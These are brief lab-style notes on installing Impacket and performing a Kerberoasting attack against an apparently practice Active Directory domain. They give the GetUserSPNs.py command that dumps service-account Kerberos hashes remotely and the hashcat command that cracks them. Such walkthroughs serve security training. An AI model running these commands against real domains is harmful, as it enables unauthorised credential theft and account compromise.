Installing Impacket:

Impacket Installation -

Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket \< 0.9.20

1.) cd /opt navigate to your preferred directory to save tools in

2.) download the precompiled package from <https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19>

3.) cd Impacket-0.9.19 navigate to the impacket directory

4.) pip install . - this will install all needed dependencies

**<u>Kerberoasting w/ Impacket</u>**

1.) cd /usr/share/doc/python3-impacket/examples/

- navigate to where GetUserSPNs.py is located

2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.186.103 -request

- this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash
